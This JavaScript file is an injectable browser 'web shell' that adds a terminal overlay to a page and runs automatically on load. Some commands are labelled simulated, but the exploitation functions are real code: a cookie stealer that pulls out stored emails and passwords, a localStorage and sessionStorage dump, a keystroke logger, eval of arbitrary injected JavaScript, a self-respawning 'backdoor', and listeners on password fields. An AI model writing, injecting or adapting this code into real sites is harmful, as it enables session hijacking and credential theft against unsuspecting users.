// 🕸️ Browser-Based Web Shell (JavaScript Version of dymxploit.php)
// File: browser_shell.js
// Deskripsi: JavaScript implementation of PHP web shell for browser environment

console.log('🚨 BROWSER SHELL PAYLOAD ACTIVATED!');
console.log('🌐 Simulating server shell access in browser environment');

// ===========================================
// BROWSER SHELL INTERFACE
// ===========================================

class BrowserShell {
    constructor() {
        this.commandHistory = [];
        this.historyPosition = 0;
        this.currentDirectory = '/var/www/html'; // Simulated
        this.isActive = false;
        
        this.init();
    }

    init() {
        console.log('🛠️ Initializing Browser Shell Interface...');
        this.createShellInterface();
        this.simulateSystemInfo();
        this.installKeyCapture();
    }

    // Create terminal-like interface
    createShellInterface() {
        // Remove existing shell if any
        const existing = document.getElementById('browser-shell');
        if (existing) existing.remove();

        // Create shell container
        const shell = document.createElement('div');
        shell.id = 'browser-shell';
        shell.innerHTML = `
            <div style="
                position: fixed;
                top: 10px;
                right: 10px;
                width: 600px;
                height: 400px;
                background: #1a1a1a;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                border: 2px solid #333;
                border-radius: 5px;
                z-index: 999999;
                box-shadow: 0 0 20px rgba(0,255,0,0.3);
            ">
                <div style="
                    background: #333;
                    color: #fff;
                    padding: 5px 10px;
                    border-bottom: 1px solid #555;
                    font-weight: bold;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                ">
                    <span>🚨 Browser Shell v1.0 - dymxploit.js</span>
                    <button onclick="document.getElementById('browser-shell').remove()" 
                            style="background: #f44; color: white; border: none; padding: 2px 8px; cursor: pointer; border-radius: 3px;">
                        ✕
                    </button>
                </div>
                
                <div id="shell-output" style="
                    height: 300px;
                    overflow-y: auto;
                    padding: 10px;
                    white-space: pre-wrap;
                    background: #000;
                ">
🚨 BROWSER SHELL ACTIVATED 🚨
Simulating server environment in browser context...

System: Browser Security Sandbox
User: web-user (limited privileges)
Directory: /var/www/html (simulated)
Access: JavaScript execution context

⚠️  WARNING: Limited to browser capabilities
⚠️  No actual server access - demo purposes only

Type 'help' for available commands.
                </div>
                
                <div style="
                    padding: 5px 10px;
                    background: #1a1a1a;
                    border-top: 1px solid #333;
                    display: flex;
                    align-items: center;
                ">
                    <span style="color: #00ff00; margin-right: 5px;">web-user@browser:~$</span>
                    <input id="shell-input" type="text" style="
                        flex: 1;
                        background: transparent;
                        border: none;
                        color: #00ff00;
                        font-family: 'Courier New', monospace;
                        font-size: 12px;
                        outline: none;
                    " placeholder="Enter command..." autocomplete="off">
                </div>
            </div>
        `;

        document.body.appendChild(shell);

        // Setup input handler
        const input = document.getElementById('shell-input');
        input.addEventListener('keydown', (e) => this.handleInput(e));
        input.focus();

        this.isActive = true;
        console.log('✅ Browser shell interface created');
    }

    // Handle command input
    handleInput(event) {
        const input = event.target;
        const command = input.value.trim();

        switch (event.key) {
            case 'Enter':
                if (command) {
                    this.executeCommand(command);
                    this.commandHistory.push(command);
                    this.historyPosition = this.commandHistory.length;
                }
                input.value = '';
                break;

            case 'ArrowUp':
                event.preventDefault();
                if (this.historyPosition > 0) {
                    this.historyPosition--;
                    input.value = this.commandHistory[this.historyPosition];
                }
                break;

            case 'ArrowDown':
                event.preventDefault();
                if (this.historyPosition < this.commandHistory.length - 1) {
                    this.historyPosition++;
                    input.value = this.commandHistory[this.historyPosition];
                } else {
                    this.historyPosition = this.commandHistory.length;
                    input.value = '';
                }
                break;

            case 'Tab':
                event.preventDefault();
                this.handleTabCompletion(input);
                break;
        }
    }

    // Execute commands (simulated)
    executeCommand(command) {
        this.addOutput(`\\nweb-user@browser:~$ ${command}`);
        
        const args = command.split(' ');
        const cmd = args[0].toLowerCase();

        switch (cmd) {
            case 'help':
                this.showHelp();
                break;
            case 'ls':
            case 'dir':
                this.listFiles(args);
                break;
            case 'pwd':
                this.addOutput(this.currentDirectory);
                break;
            case 'cd':
                this.changeDirectory(args[1] || '~');
                break;
            case 'cat':
            case 'type':
                this.displayFile(args[1]);
                break;
            case 'whoami':
                this.addOutput('web-user (browser context)');
                break;
            case 'uname':
                this.addOutput(`${navigator.platform} ${navigator.userAgent}`);
                break;
            case 'ps':
                this.showProcesses();
                break;
            case 'netstat':
                this.showNetwork();
                break;
            case 'env':
                this.showEnvironment();
                break;
            case 'history':
                this.showHistory();
                break;
            case 'clear':
                document.getElementById('shell-output').innerHTML = '';
                break;
            case 'cookies':
                this.stealCookies();
                break;
            case 'storage':
                this.dumpStorage();
                break;
            case 'keylog':
                this.toggleKeylogger();
                break;
            case 'download':
                this.downloadData(args[1]);
                break;
            case 'inject':
                this.injectPayload(args.slice(1).join(' '));
                break;
            case 'backdoor':
                this.installBackdoor();
                break;
            case 'persist':
                this.makePersistent();
                break;
            default:
                this.addOutput(`Command '${cmd}' not found. Type 'help' for available commands.`);
        }
    }

    // Add output to shell
    addOutput(text) {
        const output = document.getElementById('shell-output');
        output.textContent += '\\n' + text;
        output.scrollTop = output.scrollHeight;
    }

    // Show available commands
    showHelp() {
        const help = `
Available Commands:
===================
System Information:
  whoami          - Show current user
  uname           - System information  
  pwd             - Current directory
  env             - Environment variables
  ps              - Running processes (simulated)
  netstat         - Network connections (simulated)

File Operations:
  ls, dir         - List files (simulated)
  cd <dir>        - Change directory
  cat <file>      - Display file content
  
Browser Exploitation:
  cookies         - Steal all cookies
  storage         - Dump localStorage/sessionStorage
  keylog          - Toggle keylogger
  download <data> - Download stolen data
  inject <code>   - Execute JavaScript payload
  backdoor        - Install persistent backdoor
  persist         - Make shell persistent
  
Utility:
  history         - Command history
  clear           - Clear screen
  help            - This help message

⚠️  Browser Shell Limitations:
- No actual file system access
- Limited to browser security context
- Cannot execute system commands
- Simulated environment for demo purposes
`;
        this.addOutput(help);
    }

    // Steal cookies (actual functionality)
    stealCookies() {
        const cookies = document.cookie;
        this.addOutput('🍪 COOKIE THEFT:');
        this.addOutput(cookies || 'No cookies found');
        
        // Also log to console for easier access
        console.log('🍪 STOLEN COOKIES:', cookies);
        
        // Try to parse user credentials if available
        if (cookies.includes('user_email') || cookies.includes('user_password')) {
            this.addOutput('🚨 CRITICAL: User credentials found in cookies!');
            const cookieObj = cookies.split(';').reduce((acc, cookie) => {
                const [key, value] = cookie.trim().split('=');
                acc[key] = value;
                return acc;
            }, {});
            
            this.addOutput(`Email: ${cookieObj.user_email || 'Not found'}`);
            this.addOutput(`Password: ${cookieObj.user_password || 'Not found'}`);
        }
    }

    // Dump browser storage
    dumpStorage() {
        this.addOutput('💾 STORAGE DUMP:');
        
        // localStorage
        this.addOutput('\\n📁 localStorage:');
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            this.addOutput(`  ${key}: ${value}`);
        }
        
        // sessionStorage
        this.addOutput('\\n📁 sessionStorage:');
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            this.addOutput(`  ${key}: ${value}`);
        }
    }

    // Simulated file listing
    listFiles(args) {
        const files = [
            'index.html',
            'style.css',
            'script.js',
            'config.php',
            'database.sql',
            'uploads/',
            'admin/',
            '.htaccess',
            'backup.zip'
        ];
        
        this.addOutput('Files in current directory:');
        files.forEach(file => {
            this.addOutput(`  ${file}`);
        });
    }

    // Simulated processes
    showProcesses() {
        const processes = [
            'PID  COMMAND',
            '1    /sbin/init',
            '123  nginx: master',
            '124  nginx: worker',
            '200  php-fpm: master',
            '201  php-fpm: pool www',
            '300  mysql',
            '400  node server.js',
            '500  browser-shell.js ← YOU ARE HERE'
        ];
        
        processes.forEach(proc => this.addOutput(proc));
    }

    // Install keylogger
    toggleKeylogger() {
        if (window.browserShellKeylogger) {
            // Remove keylogger
            document.removeEventListener('keydown', window.browserShellKeylogger);
            window.browserShellKeylogger = null;
            this.addOutput('⌨️  Keylogger disabled');
        } else {
            // Install keylogger
            window.browserShellKeylogger = (e) => {
                console.log(`🔑 Key captured: ${e.key} (${e.code})`);
                // Store in localStorage for persistence
                const logs = JSON.parse(localStorage.getItem('keylog') || '[]');
                logs.push({
                    key: e.key,
                    code: e.code,
                    timestamp: new Date().toISOString(),
                    target: e.target.tagName
                });
                localStorage.setItem('keylog', JSON.stringify(logs.slice(-100))); // Keep last 100
            };
            
            document.addEventListener('keydown', window.browserShellKeylogger);
            this.addOutput('⌨️  Keylogger enabled - capturing all keystrokes');
        }
    }

    // Execute JavaScript payload
    injectPayload(code) {
        this.addOutput(`💉 Injecting payload: ${code}`);
        try {
            const result = eval(code);
            this.addOutput(`✅ Payload executed successfully`);
            if (result !== undefined) {
                this.addOutput(`Result: ${result}`);
            }
        } catch (error) {
            this.addOutput(`❌ Payload execution failed: ${error.message}`);
        }
    }

    // Install persistent backdoor
    installBackdoor() {
        const backdoorCode = `
            // Persistent backdoor
            setInterval(() => {
                if (!document.getElementById('browser-shell')) {
                    new BrowserShell();
                }
            }, 30000); // Respawn every 30 seconds
        `;
        
        // Store in localStorage for persistence
        localStorage.setItem('browser_backdoor', backdoorCode);
        
        // Execute immediately
        eval(backdoorCode);
        
        this.addOutput('🚪 Persistent backdoor installed');
        this.addOutput('Shell will respawn every 30 seconds if closed');
    }

    // Simulate system info
    simulateSystemInfo() {
        console.log('🖥️  Simulated System Information:');
        console.log('OS:', navigator.platform);
        console.log('Browser:', navigator.userAgent);
        console.log('Language:', navigator.language);
        console.log('Online:', navigator.onLine);
        console.log('Cookies Enabled:', navigator.cookieEnabled);
    }

    // Install key capture for credential theft
    installKeyCapture() {
        console.log('🔑 Installing credential capture hooks...');
        
        // Capture password fields
        const passwords = document.querySelectorAll('input[type="password"]');
        passwords.forEach(field => {
            field.addEventListener('input', (e) => {
                console.log('🔐 Password field activity detected');
                console.log('Value length:', e.target.value.length);
            });
        });
    }
}

// ===========================================
// AUTO-ACTIVATION
// ===========================================

// Activate shell immediately
console.log('🚨 Activating Browser Shell...');
const shell = new BrowserShell();

// Show activation alert
alert('🚨 BROWSER SHELL ACTIVATED!\\n\\n' +
      'A terminal interface has been injected into this page.\\n' +
      'Check the top-right corner for the shell window.\\n\\n' +
      'This demonstrates browser-based shell injection.\\n' +
      'Type "help" for available commands.');

// Export for global access
window.BrowserShell = BrowserShell;
window.currentShell = shell;

console.log('✅ Browser Shell ready - check top-right corner of page');